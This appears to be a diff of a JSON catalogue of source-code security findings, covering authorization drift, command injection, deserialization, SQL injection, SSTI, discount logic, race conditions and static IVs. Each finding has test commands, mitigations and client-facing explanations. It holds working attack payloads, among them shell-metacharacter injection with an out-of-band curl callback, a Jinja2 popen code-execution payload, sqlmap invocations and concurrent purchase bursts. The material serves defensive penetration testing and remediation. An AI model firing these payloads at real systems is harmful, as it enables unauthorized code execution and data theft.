+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V8",
+     "name": "Authorization"
+    }
+   ]
   },
   {
    "id": "SRC-009",
    "domain": "SRC",
-   "phase": 463,
    "title": "Time-of-Check Authorization Drift",
    "sequence": 463,
    "severity": "high",
@@ -594,7 +822,8 @@
     "Identify multi-step or asynchronous processing flows where an authorization check occurs at one point (e.g. when a request is submitted/queued) and the actual privileged action occurs at a later, separate point (e.g. when a background job processes the queued request).",
     "Trace whether the later action re-verifies the caller's current authorization state immediately before executing, or simply trusts that the earlier check's result remains valid.",
     "Where source access allows, identify a specific scenario to test: revoking a permission/role between the initial check and the action's eventual execution.",
-    "Build and run the application, then reproduce the timing scenario (submit the action, then revoke the relevant permission before the queued/delayed action actually executes) to confirm the gap at runtime."
+    "Build and run the application, then reproduce the timing scenario (submit the action, then revoke the relevant permission before the queued/delayed action actually executes) to confirm the gap at runtime.",
+    "Trace the interval between the authorisation check and the action it guards, confirming by testing that state cannot change in between to invalidate the decision."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes time-of-check/time-of-use authorization-drift testing against a running build of the reviewed application, using a nominated test account whose permissions can be safely modified during the test.",
@@ -610,16 +839,21 @@
     },
     {
      "label": "Submit a privileged action while holding permission, then revoke it before execution completes",
-     "command": "curl -s -X POST https://app.target.com/reports/schedule -H \"Authorization: Bearer <test-token>\" -d '{\"reportType\":\"financial\",\"delay\":\"60s\"}'\n# then, with admin test access, revoke the test account's report-generation permission before the 60s delay elapses"
+     "command": "curl -s -X POST https://<app>/reports/schedule -H \"Authorization: Bearer <test-token>\" -d '{\"reportType\":\"financial\",\"delay\":\"60s\"}'\n# then, with admin test access, revoke the test account's report-generation permission before the 60s delay elapses"
     },
     {
      "label": "Confirm whether the delayed action executed despite the revoked permission",
-     "command": "curl -s https://app.target.com/reports/status/<job-id> -H \"Authorization: Bearer <test-token>\""
+     "command": "curl -s https://<app>/reports/status/<job-id> -H \"Authorization: Bearer <test-token>\""
+    },
+    {
+     "label": "Search source for an authorisation check separated from the action it protects",
+     "command": "grep -rnE 'check(Permission|Access|Auth)|authorize|can\\(' src/ -A5 | grep -iE 'update|delete|write|execute'"
     }
    ],
    "variants": [
     "Authorization drift in an async job-queue processing flow versus in a multi-step, multi-request UI wizard where the final submission step doesn't re-check permission established in an earlier step.",
-    "Drift affecting a single user's own changing permission level versus affecting a resource's ownership transfer (the action executes against a resource the caller no longer owns by the time it runs)."
+    "Drift affecting a single user's own changing permission level versus affecting a resource's ownership transfer (the action executes against a resource the caller no longer owns by the time it runs).",
+    "A check performed against a cached permission that is not re-read after a role change, so a just-revoked privilege remains effective until the cache expires."
    ],
    "mitigation": [
     "Re-verify authorization immediately before executing any privileged action, regardless of how much time has elapsed since an earlier check, rather than trusting a stale, earlier authorization result.",
@@ -627,6 +861,7 @@
     "For genuinely unavoidable async/queued processing, design the queue-processing worker to independently re-check authorization against the current, live permission state at the moment it dequeues and executes the action.",
     "Include a specific test case simulating a permission revocation during the check-to-action window in the security-focused regression-test suite for any multi-step, permission-gated flow."
    ],
+   "mitigationClientFacing": "Your code checks that a user is authorised and then acts, but a gap between the two allows the underlying state to change in between, so the action can proceed on a permission that is no longer valid. An attacker exploits the window between the check and the act. The fix is to keep the authorisation decision and the action it guards close enough that nothing can change between them — re-checking at the point of action, or holding the relevant state stable. This is a subtle timing flaw, and while it requires precise conditions to exploit, it can allow an action after the permitting privilege has been revoked.",
    "reference": {
     "standard": "A01:2021 - Broken Access Control",
     "cwe": "CWE-862",
@@ -645,12 +880,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A01",
+   "categoryName": "Broken Access Control",
+   "attack": [
+    {
+     "id": "T1213",
+     "name": "Data from Information Repositories",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-ATHZ",
+     "name": "Authorization"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V8",
+     "name": "Authorization"
+    }
+   ]
   },
   {
    "id": "SRC-010",
    "domain": "SRC",
-   "phase": 464,
    "title": "Command Injection (Source-Identified)",
    "sequence": 464,
    "severity": "critical",
@@ -664,7 +920,8 @@
     "Search the codebase for every call site invoking an OS command via a shell-interpreting function, and trace each one back to confirm whether any part of the constructed command string originates from caller-supplied input.",
     "For each candidate, confirm whether the caller-supplied portion is passed as a properly-separated argument (safe) or concatenated directly into a single command string (vulnerable).",
     "Build and run the application, then submit a test input containing a shell metacharacter (a semicolon followed by a benign, verifiable command like `id` or `whoami`) to the identified parameter.",
-    "Confirm whether the injected command executes by observing its output reflected in the response, or an out-of-band side effect (a DNS/HTTP callback to a controlled listener) if the response doesn't directly reflect command output."
+    "Confirm whether the injected command executes by observing its output reflected in the response, or an out-of-band side effect (a DNS/HTTP callback to a controlled listener) if the response doesn't directly reflect command output.",
+    "Build the application and submit a benign command-delimiter test value to the identified sink to confirm the input reaches a shell rather than a safe API."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes command-injection testing against a running build of the reviewed application.",
@@ -680,16 +937,21 @@
     },
     {
      "label": "Test command injection via a shell metacharacter appended to the vulnerable parameter",
-     "command": "curl -s -X POST https://app.target.com/tools/ping -d 'host=127.0.0.1; id'"
+     "command": "curl -s -X POST https://<app>/tools/ping -d 'host=127.0.0.1; id'"
     },
     {
      "label": "Out-of-band confirmation if response doesn't reflect output",
-     "command": "curl -s -X POST https://app.target.com/tools/ping -d 'host=127.0.0.1; curl http://<your-collaborator-id>.oastify.com/'"
+     "command": "curl -s -X POST https://<app>/tools/ping -d 'host=127.0.0.1; curl http://<your-collaborator-id>.oastify.com/'"
+    },
+    {
+     "label": "Search source for shell execution built from request input",
+     "command": "grep -rnE 'exec\\(|system\\(|popen|ProcessBuilder|Runtime\\.getRuntime|child_process' src/"
     }
    ],
    "variants": [
     "Direct command injection via shell metacharacters versus argument injection (the input is passed as a single argument without shell interpretation, but its value can still manipulate the invoked command's own flags/behavior in an unintended way).",
-    "Injection reachable pre-authentication on a public-facing endpoint versus only reachable by an authenticated user, affecting real-world severity/exploitability."
+    "Injection reachable pre-authentication on a public-facing endpoint versus only reachable by an authenticated user, affecting real-world severity/exploitability.",
+    "Injection through an argument passed to a command that is itself fixed, where the argument reaches a shell because the call uses a shell-interpreted form rather than an argument array."
    ],
    "mitigation": [
     "Avoid invoking OS commands via a shell-interpreting function entirely wherever possible; use a language-native library/API to perform the equivalent task directly (a file-manipulation library instead of shelling out to a CLI tool).",
@@ -697,6 +959,7 @@
     "Apply strict allowlist input validation on any value that must be incorporated into a command, rejecting anything containing shell metacharacters outright.",
     "Run the process invoking external commands with the minimum OS-level privileges necessary, limiting the impact of any injection that does occur despite other mitigations."
    ],
+   "mitigationClientFacing": "A review of your code found that user-supplied input is passed to a system command in a way that lets an attacker add their own commands, which the server then runs — potentially giving them control of the server. This is among the most serious flaws a code review can find. The fix is to avoid building commands from user input at all where possible, and where a command must be run, to pass user values as separate arguments through a safe interface rather than assembling a command line the shell will interpret. This should be treated as a top priority and confirmed on the built application.",
    "reference": {
     "standard": "A03:2021 - Injection",
     "cwe": "CWE-78",
@@ -717,12 +980,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1059",
+     "name": "Command and Scripting Interpreter",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V2",
+     "name": "Validation and Business Logic"
+    }
+   ]
   },
   {
    "id": "SRC-011",
    "domain": "SRC",
-   "phase": 465,
    "title": "Insecure Deserialization (Source-Identified)",
    "sequence": 465,
    "severity": "critical",
@@ -736,7 +1020,8 @@
     "Search the codebase for calls to type-permissive native deserialization functions (`ObjectInputStream.readObject`, `BinaryFormatter.Deserialize`, `pickle.loads`, `yaml.load` without a safe loader).",
     "For each call site, trace the data source back to confirm whether it originates from anything attacker-influenceable — a cookie, a file upload, a message queue an external party can write to.",
     "Where a plausible attacker-reachable deserialization call is found, identify the exact serializer/library and version in use, since gadget-chain availability depends on which classes/libraries are loaded by the application.",
-    "Confirm whether any type-allowlisting (a custom `ObjectInputFilter`/`SerializationBinder`) is applied restricting deserialization to expected types."
+    "Confirm whether any type-allowlisting (a custom `ObjectInputFilter`/`SerializationBinder`) is applied restricting deserialization to expected types.",
+    "Trace the deserialised data to its source and build the application to confirm attacker-influenced data reaches the deserialiser, which is the precondition for exploitation."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes deserialization-based code-execution testing against a running build of the reviewed application.",
@@ -756,12 +1041,17 @@
     },
     {
      "label": "Deliver the payload via an identified attacker-reachable cookie value",
-     "command": "curl -s https://app.target.com/dashboard --cookie \"session=$(base64 -w0 payload.ser)\""
+     "command": "curl -s https://<app>/dashboard --cookie \"session=$(base64 -w0 payload.ser)\""
+    },
+    {
+     "label": "Search source for unsafe deserialisation of untrusted data",
+     "command": "grep -rnE 'pickle\\.loads|yaml\\.load\\(|readObject\\(|Marshal\\.load|unserialize\\(|ObjectInputStream' src/"
     }
    ],
    "variants": [
     "Deserialization triggered via a cookie/session-token value versus via an uploaded file or an internal message-queue payload — the attacker-reachability and authentication precondition differ by data path.",
-    "Partial mitigation present (a type allowlist) that's itself bypassable due to an overly broad type-name pattern, versus no allowlist at all."
+    "Partial mitigation present (a type allowlist) that's itself bypassable due to an overly broad type-name pattern, versus no allowlist at all.",
+    "Deserialisation of a signed object where the signature is verified with a key also recoverable from the codebase, defeating the integrity control the signature was meant to provide."
    ],
    "mitigation": [
     "Replace type-permissive native serializers with a safe, schema-constrained format (JSON with strict schema validation, protobuf) wherever the application controls both ends of the serialization.",
@@ -769,6 +1059,7 @@
     "Never deserialize data from an untrusted or externally-writable source without independent integrity verification (a signature over the serialized bytes, checked before deserialization begins).",
     "Keep the application's dependency set minimal and current, since gadget-chain availability depends heavily on which library versions are loaded."
    ],
+   "mitigationClientFacing": "Your code reconstructs complex data from an untrusted source in a way that a crafted input can abuse to run the attacker's code inside the application. The fix is to avoid reconstructing arbitrary objects from untrusted data, restricting it to simple, expected data types and rejecting anything else, or to use a safe data format that cannot carry executable content. Where the data is meant to be signed, ensure the signing key is not itself recoverable from the code. This is a high-severity pattern because it can lead directly to code execution, and it should be confirmed on the running system.",
    "reference": {
     "standard": "A08:2021 - Software and Data Integrity Failures",
     "cwe": "CWE-502",
@@ -788,12 +1079,38 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A08",
+   "categoryName": "Software or Data Integrity Failures",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    },
+    {
+     "id": "T1059",
+     "name": "Command and Scripting Interpreter",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V15",
+     "name": "Secure Coding and Architecture"
+    }
+   ]
   },
   {
    "id": "SRC-012",
    "domain": "SRC",
-   "phase": 466,
    "title": "SQL Injection (Source-Identified)",
    "sequence": 466,
    "severity": "critical",
@@ -807,7 +1124,8 @@
     "Search the codebase for raw SQL query construction — string concatenation or formatting used to build a query string, particularly any raw-query escape hatch used alongside an otherwise ORM-based codebase.",
     "For each candidate, trace the concatenated variable back to confirm it originates from caller-supplied input (a request parameter, a header, a cookie value) rather than a fixed, internal constant.",
     "Build and run the application, then submit a syntax-breaking test value (a single quote) to the identified parameter and observe whether the response indicates a database error or unhandled exception.",
-    "Where a syntax-breaking response is confirmed, use sqlmap to formally confirm and characterize the injection."
+    "Where a syntax-breaking response is confirmed, use sqlmap to formally confirm and characterize the injection.",
+    "Trace each concatenated query variable to a request-supplied source and build the application to confirm a syntax-breaking value reaches the database."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes injection testing against a running build of the reviewed application, for the specific parameter identified via source review.",
@@ -823,16 +1141,21 @@
     },
     {
      "label": "Test for a syntax-breaking response",
-     "command": "curl -s \"https://app.target.com/search?query=test'\""
+     "command": "curl -s \"https://<app>/search?query=test'\""
     },
     {
      "label": "Automated confirmation and exploitation with sqlmap",
-     "command": "sqlmap -u \"https://app.target.com/search?query=test\" --batch --level 3 --risk 2"
+     "command": "sqlmap -u \"https://<app>/search?query=test\" --batch --level 3 --risk 2"
+    },
+    {
+     "label": "Confirm a concatenated query variable originates from request input",
+     "command": "grep -rnE 'query|execute|raw' src/ -A2 | grep -iE 'req\\.|request\\.|params|\\+'"
     }
    ],
    "variants": [
     "Injection in a raw-query escape hatch within an otherwise ORM-based codebase (an easier gap to overlook precisely because most of the codebase is otherwise safe by convention) versus a codebase built without an ORM at all, where every query is individually at risk.",
-    "First-order injection (the malicious input is used immediately in a query) versus second-order (the input is stored via one code path and only triggers injection when a separate, later query incorporates the stored value unsafely)."
+    "First-order injection (the malicious input is used immediately in a query) versus second-order (the input is stored via one code path and only triggers injection when a separate, later query incorporates the stored value unsafely).",
+    "A parameterised codebase with a single raw-query escape hatch, which is easily overlooked precisely because the surrounding code is safe."
    ],
    "mitigation": [
     "Use parameterized queries/prepared statements (or the ORM's safe query-building methods) for every query incorporating caller-supplied input, eliminating raw-query string concatenation entirely.",
@@ -840,6 +1163,7 @@
     "Apply the principle of least privilege to the database account the application uses, limiting the blast radius of any injection that does occur.",
     "Add a static-analysis (SAST) rule flagging raw string concatenation into a query-construction call as a mandatory code-review blocker."
    ],
+   "mitigationClientFacing": "A review of your code found user input placed directly into database queries in a way that lets an attacker alter what those queries do — reading, changing or deleting data they should not reach. This is a classic and serious flaw. The fix is to build every query using parameterised statements, which keep user input strictly separate from the query's logic, so input is always treated as a value and never as part of the command. Pay particular attention to any single raw-query shortcut in an otherwise safe codebase, since those are easily overlooked. This warrants prompt attention and confirmation on the built application.",
    "reference": {
     "standard": "A03:2021 - Injection",
     "cwe": "CWE-89",
@@ -858,12 +1182,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V2",
+     "name": "Validation and Business Logic"
+    }
+   ]
   },
   {
    "id": "SRC-013",
    "domain": "SRC",
-   "phase": 467,
    "title": "Server-Side Template Injection (Source-Identified)",
    "sequence": 467,
    "severity": "critical",
@@ -877,7 +1222,8 @@
     "Search the codebase for template-rendering calls where the template string itself (not just the data context passed into it) is built via concatenation or formatting incorporating caller-supplied input.",
     "Identify the specific template engine in use, since exploitation payloads and the achievable impact ceiling differ significantly between engines (Jinja2/Python, Twig/PHP, FreeMarker/Java, Handlebars/JavaScript).",
     "Build and run the application, then submit a template-engine-specific probe expression (e.g. `{{7*7}}` for Jinja2/Twig) to the identified input and observe whether the response reflects the evaluated result (`49`) rather than the literal probe string, confirming the input reaches template compilation.",
-    "Where confirmed, escalate to an engine-specific payload targeting known code-execution gadgets/objects reachable from that engine's expression language."
+    "Where confirmed, escalate to an engine-specific payload targeting known code-execution gadgets/objects reachable from that engine's expression language.",
+    "Build the application and submit a benign template-expression test value to confirm the input is evaluated by the template engine rather than treated as literal text."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes SSTI testing against a running build of the reviewed application.",
@@ -893,16 +1239,21 @@
     },
     {
      "label": "Jinja2/Twig arithmetic probe to confirm template compilation",
-     "command": "curl -s \"https://app.target.com/greet?name=%7B%7B7*7%7D%7D\""
+     "command": "curl -s \"https://<app>/greet?name=%7B%7B7*7%7D%7D\""
     },
     {
      "label": "Jinja2 code-execution payload (Python-based engine)",
-     "command": "curl -s \"https://app.target.com/greet\" -d 'name={{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read() }}'"
+     "command": "curl -s \"https://<app>/greet\" -d 'name={{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read() }}'"
+    },
+    {
+     "label": "Search source for user input concatenated into a template string before rendering",
+     "command": "grep -rnE 'render_template_string|Template\\(|new Template|Handlebars\\.compile|\\.render\\(' src/ -A2 | grep -iE 'req|request|input|param'"
     }
    ],
    "variants": [
     "SSTI in a Python-based engine (Jinja2) with a well-documented, powerful sandbox-escape chain to full code execution, versus an engine with a more restrictive default sandbox (some FreeMarker/Twig configurations) where impact may be limited to content injection rather than full RCE.",
-    "SSTI triggered via a user-facing input field versus via an internal, less-obvious data path (an email-template-generation feature incorporating a user's display name unsanitized into the template)."
+    "SSTI triggered via a user-facing input field versus via an internal, less-obvious data path (an email-template-generation feature incorporating a user's display name unsanitized into the template).",
+    "Template injection through a field intended for a simple value — a name in an email template — rather than an obvious template input, which review of the main template paths misses."
    ],
    "mitigation": [
     "Never construct a template string dynamically by incorporating caller-supplied input into the template syntax itself; use a fixed, developer-authored template and pass all user input purely as data values within its rendering context.",
@@ -910,6 +1261,7 @@
     "Where the template engine offers a sandboxed rendering mode, enable and rigorously test it, understanding many \"sandboxes\" have documented escape techniques and shouldn't be relied upon as the sole protection.",
     "Apply strict input validation to any value that must be used in a template-selection context, rejecting anything resembling template-engine syntax."
    ],
+   "mitigationClientFacing": "Your code places user input into a template that is then evaluated, which lets an attacker supply input that the template engine executes — often a route to running code on the server. The fix is to never build templates from user input: treat user-supplied values strictly as data inserted into a fixed template, not as part of the template itself. Watch for this in unexpected places, such as a name inserted into an email template, not only in obvious template inputs. This is a high-impact flaw because it can lead to server-side code execution, and it should be confirmed on the running application.",
    "reference": {
     "standard": "A03:2021 - Injection",
     "cwe": "CWE-1336",
@@ -929,12 +1281,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V2",
+     "name": "Validation and Business Logic"
+    }
+   ]
   },
   {
    "id": "SRC-014",
    "domain": "SRC",
-   "phase": 468,
    "title": "Business Logic Flaw in Discount Calculation Function",
    "sequence": 468,
    "severity": "medium",
@@ -948,7 +1321,8 @@
     "Read the complete discount/pricing calculation logic, tracing exactly how multiple discount types (percentage, flat, coupon-based) interact and whether any explicit maximum-discount or mutual-exclusivity enforcement exists.",
     "Identify specific input combinations or repeated-application sequences that the logic's structure suggests might not be correctly bounded (e.g. applying the same percentage discount function twice in a multi-step checkout flow without a check that it's already been applied).",
     "Build and run the application (or its checkout API), then attempt the identified combination/sequence against a test cart/order to observe the resulting calculated total.",
-    "Confirm whether the resulting discount exceeds the intended maximum, or the total price is unreasonably (or impossibly, e.g. negative) low."
+    "Confirm whether the resulting discount exceeds the intended maximum, or the total price is unreasonably (or impossibly, e.g. negative) low.",
+    "Build the application and exercise the discount function with boundary and combined inputs to confirm the logic flaw produces an unintended price at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes business-logic testing against a running build of the reviewed application's checkout/pricing functionality, using a test account and test order.",
@@ -964,16 +1338,21 @@
     },
     {
      "label": "Attempt to apply the same discount coupon twice within a multi-step checkout flow",
-     "command": "curl -s -X POST https://app.target.com/cart/apply-coupon -H \"Authorization: Bearer <test-token>\" -d '{\"code\":\"SAVE20\"}'\ncurl -s -X POST https://app.target.com/cart/apply-coupon -H \"Authorization: Bearer <test-token>\" -d '{\"code\":\"SAVE20\"}'"
+     "command": "curl -s -X POST https://<app>/cart/apply-coupon -H \"Authorization: Bearer <test-token>\" -d '{\"code\":\"SAVE20\"}'\ncurl -s -X POST https://<app>/cart/apply-coupon -H \"Authorization: Bearer <test-token>\" -d '{\"code\":\"SAVE20\"}'"
     },
     {
      "label": "Attempt to stack two normally-mutually-exclusive discount types",
-     "command": "curl -s -X POST https://app.target.com/cart/apply-coupon -H \"Authorization: Bearer <test-token>\" -d '{\"code\":\"NEWUSER50\"}'\ncurl -s -X POST https://app.target.com/cart/apply-coupon -H \"Authorization: Bearer <test-token>\" -d '{\"code\":\"CLEARANCE70\"}'"
+     "command": "curl -s -X POST https://<app>/cart/apply-coupon -H \"Authorization: Bearer <test-token>\" -d '{\"code\":\"NEWUSER50\"}'\ncurl -s -X POST https://<app>/cart/apply-coupon -H \"Authorization: Bearer <test-token>\" -d '{\"code\":\"CLEARANCE70\"}'"
+    },
+    {
+     "label": "Search source for the discount or pricing logic and inspect its ordering and bounds",
+     "command": "grep -rnE 'discount|price|total|subtotal|coupon|voucher' src/ | grep -iE 'calc|apply|compute'"
     }
    ],
    "variants": [
     "Discount-stacking flaw (two discounts that should be mutually exclusive both applying) versus a repeated-application flaw (the same single discount applied more than once via a multi-step flow lacking idempotency).",
-    "Flaw producing an excessive-but-still-positive discount versus one capable of producing a negative total, the latter being materially more severe since it could result in the business owing the customer money."
+    "Flaw producing an excessive-but-still-positive discount versus one capable of producing a negative total, the latter being materially more severe since it could result in the business owing the customer money.",
+    "A flaw exploitable only by combining two individually-valid discounts, where each is bounded correctly but their interaction is not."
    ],
    "mitigation": [
     "Implement an explicit, enforced maximum total-discount cap (as a percentage or absolute amount) applied as a final validation step regardless of how many individual discounts were combined to reach that total.",
@@ -981,6 +1360,7 @@
     "Design multi-step checkout/discount-application flows to be idempotent — reapplying the same coupon/discount code should have no additional effect rather than compounding.",
     "Include business-logic-specific test cases (discount stacking, repeated application, boundary/edge-case order values) in the standard regression-test suite for the pricing/checkout module."
    ],
+   "mitigationClientFacing": "A review of your pricing or discount code found logic that can be manipulated to produce a price lower than intended — through boundary values, combined discounts, or an ordering flaw in the calculation. This is a business-logic issue rather than a technical vulnerability, so automated tools miss it, but it has a direct financial cost. The fix is to correct the calculation so its bounds and ordering cannot be exploited, and to enforce those rules on the server regardless of what the client submits. Confirm the fix by exercising the corrected logic with the same boundary and combined inputs that revealed the flaw.",
    "reference": {
     "standard": "A04:2021 - Insecure Design",
     "cwe": "CWE-841",
@@ -1000,12 +1380,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A06",
+   "categoryName": "Insecure Design",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-BUSL",
+     "name": "Business Logic"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V2",
+     "name": "Validation and Business Logic"
+    }
+   ]
   },
   {
    "id": "SRC-015",
    "domain": "SRC",
-   "phase": 469,
    "title": "Race Condition / TOCTOU (Source-Identified)",
    "sequence": 469,
    "severity": "high",
@@ -1019,7 +1420,8 @@
     "Search the codebase for a check-then-act pattern on a shared, mutable resource — a separate read (checking a balance/quantity) followed by a separate write (deducting/decrementing) rather than a single, atomic conditional update.",
     "Confirm whether the surrounding code applies any database-level locking (a `SELECT ... FOR UPDATE`, a transaction with an appropriate isolation level) that would close the race window despite the logically-separated check and act steps.",
     "Build and run the application, then fire a burst of concurrent requests against the identified endpoint (using a test account with a known, limited balance/stock scenario) to test whether the race condition is practically exploitable.",
-    "Confirm whether the total effect of the concurrent requests exceeds what the resource's actual starting state should have permitted."
+    "Confirm whether the total effect of the concurrent requests exceeds what the resource's actual starting state should have permitted.",
+    "Build the application and drive the identified operation concurrently to confirm the race is exploitable at run time rather than only theoretically present in the code."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes concurrency/race-condition testing against a running build of the reviewed application, using a nominated test account with a controlled starting balance/stock scenario.",
@@ -1039,12 +1441,17 @@
     },
     {
      "label": "Simple concurrent-request test via a shell loop with backgrounding",
-     "command": "for i in $(seq 1 20); do curl -s -X POST https://app.target.com/purchase -H \"Authorization: Bearer <test-token>\" -d '{\"itemId\":\"limited-stock-item\"}' & done; wait"
+     "command": "for i in $(seq 1 20); do curl -s -X POST https://<app>/purchase -H \"Authorization: Bearer <test-token>\" -d '{\"itemId\":\"limited-stock-item\"}' & done; wait"
+    },
+    {
+     "label": "Search source for a check-then-act sequence on shared state without a lock",
+     "command": "grep -rnE 'if\\s*\\(.*(balance|stock|count|quota|limit).*\\)' src/ -A5 | grep -iE 'update|decrement|-=|save'"
     }
    ],
    "variants": [
     "Race condition on a financial balance-deduction operation versus on a limited-stock inventory decrement — both share the same non-atomic check-then-act root cause but differ in business-impact category.",
-    "Race condition exploitable via simple, simultaneous request bursts versus requiring more precise timing manipulation (a slow-response trigger on one request to widen the race window for others)."
+    "Race condition exploitable via simple, simultaneous request bursts versus requiring more precise timing manipulation (a slow-response trigger on one request to widen the race window for others).",
+    "A race in a balance or stock decrement that allows a value to be spent twice, distinct from a race in a one-time-use token or coupon redemption."
    ],
    "mitigation": [
     "Replace the separated check-then-act pattern with a single, atomic database operation — a conditional `UPDATE ... WHERE balance >= amount` that both checks and updates in one indivisible statement, relying on the database to reject the update if the condition is no longer true.",
@@ -1052,6 +1459,7 @@
     "Apply application-level rate limiting or idempotency-key requirements on financially/inventory-sensitive endpoints as a defense-in-depth measure, reducing the practical window for race-condition abuse.",
     "Include concurrency-specific test cases (firing concurrent requests against a resource with a known, limited starting state) in the standard security-focused regression-test suite."
    ],
+   "mitigationClientFacing": "Your code checks a condition and then acts on it, but under concurrent requests the condition can change between the check and the action, letting an attacker do something twice that should only happen once — spend a balance twice, redeem a single-use item repeatedly. The fix is to make the check-and-act sequence atomic, so that concurrent requests cannot slip between the two, typically using a database-level lock or constraint. This is a timing flaw that needs deliberate concurrent requests to exploit, but where it affects balances, stock or one-time-use items, the financial or logical impact is direct.",
    "reference": {
     "standard": "A04:2021 - Insecure Design",
     "cwe": "CWE-367",
@@ -1071,12 +1479,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A10",
+   "categoryName": "Mishandling of Exceptional Conditions",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-BUSL",
+     "name": "Business Logic"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V2",
+     "name": "Validation and Business Logic"
+    }
+   ]
   },
   {
    "id": "SRC-016",
    "domain": "SRC",
-   "phase": 470,
    "title": "Hardcoded Encryption IV / Static Nonce Reuse",
    "sequence": 470,
    "severity": "high",
@@ -1090,7 +1519,8 @@
     "Search the codebase for encryption call sites and confirm whether the IV/nonce parameter is a literal, hardcoded value or a per-call freshly-generated one.",
     "Where a per-call generation is used, confirm it uses a cryptographically secure random source rather than a predictable one (overlapping with the insecure-randomness finding).",
     "Confirm the specific cipher mode in use (CBC, CTR, GCM), since the severity of IV/nonce reuse differs materially between modes.",
-    "Build and run the application (or a standalone test harness reproducing the call), encrypt several different plaintexts with the identified function, and confirm whether the same IV is indeed reused across each, and whether structural information (e.g. identical block patterns for identical plaintext blocks in CBC mode) is observably leaked."
+    "Build and run the application (or a standalone test harness reproducing the call), encrypt several different plaintexts with the identified function, and confirm whether the same IV is indeed reused across each, and whether structural information (e.g. identical block patterns for identical plaintext blocks in CBC mode) is observably leaked.",
+    "Trace the initialisation vector or nonce to confirm it is fixed in code rather than generated per operation, and build to confirm the same value is reused across encryptions."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes cryptographic-analysis testing against a running build (or standalone harness) of the reviewed encryption code.",
@@ -1111,11 +1541,16 @@
     {
      "label": "Demonstrate plaintext recovery via ciphertext XOR under nonce reuse (CTR/GCM-style stream cipher)",
      "command": "python3 -c \"\nc1 = bytes.fromhex('<ciphertext1>')\nc2 = bytes.fromhex('<ciphertext2>')\nxor = bytes(a ^ b for a, b in zip(c1, c2))  # equals plaintext1 XOR plaintext2 under nonce reuse\nprint(xor)\n\""
+    },
+    {
+     "label": "Search source for a hardcoded IV or static nonce passed to an encryption call",
+     "command": "grep -rnE 'IvParameterSpec|iv\\s*=\\s*[\"\\x27]|nonce\\s*=\\s*[\"\\x27]|createCipheriv' src/"
     }
    ],
    "variants": [
     "Hardcoded IV in CBC mode (structural, block-level leakage) versus a hardcoded/reused nonce in CTR or GCM mode (full plaintext-recovery and, for GCM, authentication-key-recovery risk) — the latter is materially more severe.",
-    "IV/nonce reuse across every encryption operation globally versus reuse limited to a specific, narrower context (e.g. only when re-encrypting the same record) that still enables a related-plaintext attack in that narrower scope."
+    "IV/nonce reuse across every encryption operation globally versus reuse limited to a specific, narrower context (e.g. only when re-encrypting the same record) that still enables a related-plaintext attack in that narrower scope.",
